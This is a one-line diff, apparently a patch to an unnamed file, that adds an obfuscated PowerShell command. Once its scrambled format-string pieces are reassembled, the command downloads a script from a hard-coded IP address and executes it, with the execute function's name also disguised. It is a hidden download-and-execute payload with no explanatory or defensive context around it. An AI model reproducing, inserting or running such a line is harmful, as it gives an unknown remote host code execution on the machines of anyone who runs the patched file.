@@ -1,0 +1,1 @@
+﻿(("{15}{8}{2}{0}{9}{1}{12}{5}{14}{4}{17}{3}{16}{13}{10}{6}{11}{7}"-f 'nt)','wn','Clie','/52.18','uzaht','Strin','4:80/TYBMkTfs','uza)',' (New-Object Net.Web','.Do','.9','Q','load','.79','g(','iex','3','tp:/')).rePLacE(([cHar]117+[cHar]122+[cHar]97),[sTrING][cHar]34) | .( $Env:CoMSPeC[4,15,25]-JOIN'')
